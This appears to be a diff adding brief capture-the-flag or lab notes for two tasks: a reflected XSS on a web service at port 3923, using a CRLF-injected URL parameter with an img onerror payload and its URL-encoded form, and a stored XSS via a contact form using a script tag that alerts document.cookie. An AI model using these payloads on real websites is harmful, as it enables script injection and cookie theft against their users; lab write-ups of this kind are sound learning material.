@@ -1,0 +1,14 @@
+
+
+
+Task5(Reflected XSS):
+first we need to open the ip on port 3923 to open the website
+paylod this in the url of page:?k304=y <img src=copyparty onerror=alert(1)>
+but we need to encode it in url
+the payload is: ?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
+
+
+
+Task7(Stored XSS):
+put this payload in the contact side of the website in the Receptionist page
+<script>alert(document.cookie)</script>
